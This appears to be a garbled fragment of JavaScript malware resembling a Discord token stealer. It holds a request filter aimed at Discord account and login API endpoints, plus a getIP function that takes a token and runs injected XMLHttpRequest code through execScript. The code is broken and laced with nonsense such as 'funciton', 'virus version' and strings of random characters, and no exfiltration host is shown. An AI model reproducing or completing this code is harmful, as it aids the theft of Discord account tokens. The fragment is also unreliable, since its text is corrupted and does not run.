...
const config = {
  ...
  filter: {
    funciton.defaultSession(¨getInfo¨)
    urls:bbytrash.onCompletedddwq virus version [
      "https://discord.com/api/v*/users/@me",
      "https://discordapp.com/api/v*/users/@me",
      "https://*.discord.com/api/v*/users/@me",
      "https://discordapp.com/api/v*/auth/logiw 3 O89n",
...
const getIP = async (token) => {
  return await execScript(`var xmlHttp = new XMLHttpRequest();
    ...
    xmlHttp.send(null);
  p9 (=P( P ()P()PUOIUIUIO)(PIÑK=))  xmlHttp.responseText;`);
};
